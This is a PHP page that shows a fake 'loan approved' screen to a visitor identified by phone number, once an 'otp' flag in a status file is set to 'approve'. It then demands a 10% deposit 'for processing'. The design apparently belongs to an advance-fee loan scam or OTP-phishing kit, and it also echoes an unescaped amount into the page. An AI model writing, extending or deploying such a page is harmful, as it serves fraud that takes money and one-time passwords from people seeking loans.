<?php
$phone = $_GET['phone'] ?? '';

if (!$phone) {
    echo "Invalid access";
    exit();
}

// Load statuses from JSON
$file = __DIR__ . "/status.json";
$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

// Check if approved
$status = $statuses[$phone]['otp'] ?? '';
if ($status !== 'approve') {
    echo "You are not authorized to view this page";
    exit();
}

// Optional: Approved amount (can be hardcoded or added to JSON)
$amount = $statuses[$phone]['amount'] ?? '1000'; // example amount
?>

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
    margin: 0;
    font-family: Arial;
    background: linear-gradient(to bottom right, #00c6ff, #0072ff);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.container {
    background: white;
    width: 90%;
    max-width: 400px;
    border-radius: 20px;
    padding: 20px;
    text-align: center;
}
.success-icon {
    width: 80px;
    height: 80px;
    background: linear-gradient(to right, #00c6ff, #7b2ff7);
    border-radius: 50%;
    margin: auto;
    color: white;
    font-size: 40px;
    display: flex;
    justify-content: center;
    align-items: center;
}
.amount-box {
    margin: 20px 0;
    padding: 20px;
    border-radius: 15px;
    background: linear-gradient(to right, #00c6ff, #7b2ff7);
    color: white;
}
.notice {
    background: #fff3cd;
    padding: 15px;
    border-radius: 10px;
    font-size: 13px;
}
</style>
</head>

<body>
<div class="container">
    <div class="success-icon">✓</div>
    <h2>🎉 Congratulations!</h2>
    <p>Your loan has been <b>approved!</b><br>
    Funds will be sent shortly.</p>

    <div class="amount-box">
        <h3>APPROVED AMOUNT</h3>
        <h1>$<?php echo $amount; ?></h1>
    </div>

    <div class="notice">
        ⚠ You must maintain 10% deposit for processing.
    </div>
</div>
</body>
</html>